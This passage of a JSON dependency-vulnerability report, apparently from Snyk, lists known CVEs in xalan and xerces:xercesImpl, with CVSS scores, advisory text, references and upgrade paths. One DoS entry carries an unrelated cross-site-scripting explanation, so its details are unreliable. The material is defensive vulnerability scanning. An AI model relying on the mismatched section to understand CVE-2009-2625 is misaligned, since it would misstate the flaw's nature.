Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1080248)\n",
      "epssDetails": {
        "percentile": "0.74449",
        "probability": "0.00544",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2014-0107"
        ],
        "CWE": [
          "CWE-264"
        ]
      },
      "packageName": "xalan:xalan",
      "proprietary": false,
      "creationTime": "2017-02-22T07:28:32.257000Z",
      "functions_new": [
        {
          "version": [
            "[,2.7.2)"
          ],
          "functionId": {
            "className": "org.apache.xalan.processor.XSLTElementProcessor",
            "functionName": "setPropertiesFromAttributes"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2014-04-15T23:13:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xalan",
        "artifactId": "xalan"
      },
      "publicationTime": "2014-06-06T19:55:53Z",
      "modificationTime": "2023-08-29T17:59:03.252650Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "xom:xom@1.2.5",
        "xalan:xalan@2.7.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xalan:xalan",
      "version": "2.7.0"
    },
    {
      "id": "SNYK-JAVA-XERCES-2359991",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "credit": [
        "Sergey Temnikov",
        "Ziyi Luo"
      ],
      "semver": {
        "vulnerable": [
          "[0,2.12.2)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.12.2"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "https://lists.apache.org/thread/6pjwm10bb69kq955fzr1n0nflnjd27dl",
          "title": "Apache Pony Mail"
        },
        {
          "url": "https://svn.apache.org/viewvc?view=revision&revision=1897143",
          "title": "Fix Revision"
        },
        {
          "url": "https://markmail.org/message/vcmhwbuorfgcdr6l",
          "title": "MarkMail"
        },
        {
          "url": "https://xerces.apache.org/xerces2-j/releases.html",
          "title": "Release Notes"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-05-11T11:26:36.684848Z"
        },
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.5,
          "modificationTime": "2022-10-29T01:10:37.776047Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.5,
          "modificationTime": "2022-10-26T00:42:14.827883Z"
        }
      ],
      "description": "## Overview\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) via the XML parser when handling specially crafted XML document payloads. When the parser tries to parse such a document it gets stuck in an infinite loop for a long time, which consumes resources.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.12.2 or higher.\n## References\n- [Apache Pony Mail](https://lists.apache.org/thread/6pjwm10bb69kq955fzr1n0nflnjd27dl)\n- [Fix Revision](https://svn.apache.org/viewvc?view=revision&revision=1897143)\n- [MarkMail](https://markmail.org/message/vcmhwbuorfgcdr6l)\n- [Release Notes](https://xerces.apache.org/xerces2-j/releases.html)\n",
      "epssDetails": {
        "percentile": "0.72280",
        "probability": "0.00474",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-23437"
        ],
        "CWE": [
          "CWE-400"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2022-01-25T13:09:32.813975Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-01-25T12:51:04Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2022-01-25T17:40:01.032114Z",
      "modificationTime": "2022-10-29T01:10:37.776047Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "xom:xom@1.2.5",
        "xerces:xercesImpl@2.8.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.8.0"
    },
    {
      "id": "SNYK-JAVA-XERCES-30183",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.0.SP5)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.0.SP5"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "http://svn.apache.org/viewvc?view=revision&revision=1499506",
          "title": "Apache-SVN"
        },
        {
          "url": "https://bugzilla.redhat.com/CVE-2013-4002",
          "title": "Redhat Bugzilla"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.5,
          "modificationTime": "2023-02-09T11:24:02.781225Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2023-02-09T11:24:55.164799Z"
        }
      ],
      "description": "## Overview\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) which is caused by the way the JRE processes XML files. A remote attacker could use this flaw to supply crafted XML that would lead to a denial of service.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.11.0.SP5 or higher.\n## References\n- [Apache-SVN](http://svn.apache.org/viewvc?view=revision&revision=1499506)\n- [Redhat Bugzilla](https://bugzilla.redhat.com/CVE-2013-4002)\n",
      "epssDetails": {
        "percentile": "0.82442",
        "probability": "0.01104",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2013-4002"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2016-12-25T16:51:49Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2013-07-23T11:03:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2013-10-15T16:51:49Z",
      "modificationTime": "2023-02-09T11:24:55.164799Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "xom:xom@1.2.5",
        "xerces:xercesImpl@2.8.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.8.0"
    },
    {
      "id": "SNYK-JAVA-XERCES-31497",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:F/RL:O/RC:R",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.0)"
        ]
      },
      "exploit": "Functional",
      "fixedIn": [
        "2.11.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.3,
      "functions": [
        {
          "version": [
            "[,2.11.0)"
          ],
          "functionId": {
            "filePath": "org/apache/xerces/impl/XMLEntityManager.java",
            "className": "XMLEntityManager",
            "functionName": "setupCurrentEntity"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "https://blogs.securiteam.com/index.php/archives/3271",
          "title": "Blog Post"
        },
        {
          "url": "https://www.exploit-db.com/exploits/44057",
          "title": "Exploit DB"
        },
        {
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-10355",
          "title": "NVD"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-10-07T01:11:33.776528Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-09-01T18:44:55.004538Z"
        }
      ],
      "description": "## Overview\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). An attacker may be able to force the target server to parse an FTP URL, which points to an FTP server controller by the attacker. When the target server is mid way through fetching the FTP resources, the attackers malicious FTP server will exit the process and will leave the thread hanging in the target server.\r\n\r\nIt is possible to conduct this attack only if the following conditions are met:\r\n* An attacker can pass an URL parameter that points to a controlled FTP server to the target.\r\n* Target server uses vulnerable component(s) to fetch the resource specified by the attacker.\r\n* Target server does not prevent fetching of FTP URI resources.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.11.0 or higher.\n## References\n- [Blog Post](https://blogs.securiteam.com/index.php/archives/3271)\n- [Exploit DB](https://www.exploit-db.com/exploits/44057)\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-10355)\n",
      "epssDetails": {
        "percentile": "0.68449",
        "probability": "0.00364",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2017-10355"
        ],
        "CWE": [
          "CWE-400"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2017-09-08T16:02:15.301000Z",
      "functions_new": [
        {
          "version": [
            "[,2.11.0)"
          ],
          "functionId": {
            "className": "org.apache.xerces.impl.XMLEntityManager",
            "functionName": "setupCurrentEntity"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2017-08-29T23:00:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2017-09-08T16:02:15Z",
      "modificationTime": "2022-10-07T01:11:33.776528Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "xom:xom@1.2.5",
        "xerces:xercesImpl@2.8.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.8.0"
    },
    {
      "id": "SNYK-JAVA-XERCES-31585",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "credit": [
        "Juraj Somorovsky"
      ],
      "semver": {
        "vulnerable": [
          "[0,2.12.0)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.12.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [
        {
          "version": [
            "[2.6.2,2.12.0)"
          ],
          "functionId": {
            "filePath": "org/apache/xerces/util/XMLAttributesImpl.java",
            "className": "XMLAttributesImpl",
            "functionName": "addAttribute"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "https://github.com/apache/xerces2-j/commit/992b5d9c24102ad20330d36c0a71162753a37449",
          "title": "GitHub Commit"
        },
        {
          "url": "https://issues.apache.org/jira/browse/XERCESJ-1685?jql=project%20%3D%20XERCESJ",
          "title": "Jira Issue"
        },
        {
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2012-0881",
          "title": "NVD"
        },
        {
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=787104",
          "title": "RedHat Bugzilla Bug"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-01-03T17:22:51.488507Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2023-02-09T11:25:01.854327Z"
        }
      ],
      "description": "## Overview\n\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\n\nAffected versions of this package are vulnerable to Denial of Service (DoS).\nApache Xerces2 Java allows remote attackers to cause a denial of service (CPU consumption) via a crafted message to an XML service, which triggers hash table collisions.\n\n## Remediation\n\nUpgrade `xerces:xercesImpl` to version 2.12.0 or higher.\n\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\r\n\r\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\r\n\r\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\r\n\r\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\r\n\r\nTwo common types of DoS vulnerabilities:\r\n\r\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\r\n\r\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)\n\n## References\n\n- [GitHub Commit](https://github.com/apache/xerces2-j/commit/992b5d9c24102ad20330d36c0a71162753a37449)\n\n- [Jira Issue](https://issues.apache.org/jira/browse/XERCESJ-1685?jql=project%20%3D%20XERCESJ)\n\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2012-0881)\n\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=787104)\n",
      "epssDetails": {
        "percentile": "0.80882",
        "probability": "0.00939",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2012-0881"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-vmqm-g3vh-847m"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2017-11-12T08:41:04.509000Z",
      "functions_new": [
        {
          "version": [
            "[2.6.2,2.12.0)"
          ],
          "functionId": {
            "className": "org.apache.xerces.util.XMLAttributesImpl",
            "functionName": "addAttribute"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2012-02-02T22:00:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2017-11-16T08:41:04Z",
      "modificationTime": "2023-02-09T11:25:01.854327Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "xom:xom@1.2.5",
        "xerces:xercesImpl@2.8.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.8.0"
    },
    {
      "id": "SNYK-JAVA-XERCES-32014",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "credit": [
        "Jukka Taimisto",
        "Tero Rontti",
        "Rauli Kaksonen"
      ],
      "semver": {
        "vulnerable": [
          "[,2.10.0)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.10.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.3,
      "functions": [
        {
          "version": [
            "[,2.10.0)"
          ],
          "functionId": {
            "filePath": "org/apache/xerces/impl/XMLScanner.java",
            "className": "XMLScanner",
            "functionName": "scanExternalID"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "https://github.com/apache/xerces2-j/commit/0bdf77af1d4fd26ec2e630fb6d12e2dfa77bc12b",
          "title": "GitHub Commit"
        },
        {
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2009-2625",
          "title": "NVD"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2023-02-09T11:24:31.964908Z"
        },
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2023-02-09T11:22:59.748296Z"
        }
      ],
      "description": "## Overview\n\n[xerces:xercesImpl](http://xerces.apache.org) is an that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\n\nAffected versions of this package are vulnerable to Denial of Service (DoS).\n`XMLScanner.java` in Apache Xerces2 Java, as used in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 15 and JDK and JRE 5.0 before Update 20, and in other products, allows remote attackers to cause a denial of service (infinite loop and application hang) via malformed XML input, as demonstrated by the Codenomicon XML fuzzing framework.\n\n## Details\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\n\nUpgrade `xerces:xercesImpl` to version 2.10.0 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/apache/xerces2-j/commit/0bdf77af1d4fd26ec2e630fb6d12e2dfa77bc12b)\n\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2009-2625)\n",
      "epssDetails": {
        "percentile": "0.87936",
        "probability": "0.02230",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2009-2625"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-334p-wv2m-w3vp"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2017-12-02T20:50:44.742000Z",
      "functions_new": [
        {
          "version": [
            "[,2.10.0)"
          ],
          "functionId": {
            "className": "org.apache.xerces.impl.XMLScanner",
            "functionName": "scanExternalID"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2009-08-03T20:50:44Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2017-12-04T13:10:45Z",
      "modificationTime": "2023-02-09T11:24:31.964908Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "xom:xom@1.2.5",
        "xerces:xercesImpl@2.8.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.8.0"
    },
    {
      "id": "SNYK-JAVA-XERCES-5920442",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,2.12.0)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.12.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "https://lists.apache.org/thread.html/49dc6702104a86ecbb40292dcd329ce9ae4c32b74733199ecab14a73@%3Cj-users.xerces.apache.org%3E",
          "title": "Apache Security Advisory"
        },
        {
          "url": "https://support.hpe.com/hpsc/doc/public/display?docLocale=en_US&docId=emr_na-hpesbst03857en_us",
          "title": "CONFIRM"
        },
        {
          "url": "https://www.debian.org/security/2018/dsa-4185",
          "title": "Debian Security Advisory"
        },
        {
          "url": "https://security.netapp.com/advisory/ntap-20180419-0001/",
          "title": "Netapp Security Advisory"
        },
        {
          "url": "http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html",
          "title": "Oracle Security Advisory"
        },
        {
          "url": "https://access.redhat.com/errata/RHSA-2018:1188",
          "title": "RHSA Security Advisory"
        },
        {
          "url": "http://www.securityfocus.com/bid/103872",
          "title": "Security Focus"
        },
        {
          "url": "http://www.securitytracker.com/id/1040697",
          "title": "Security Tracker"
        },
        {
          "url": "https://usn.ubuntu.com/3644-1/",
          "title": "Ubuntu Security Advisory"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "medium",
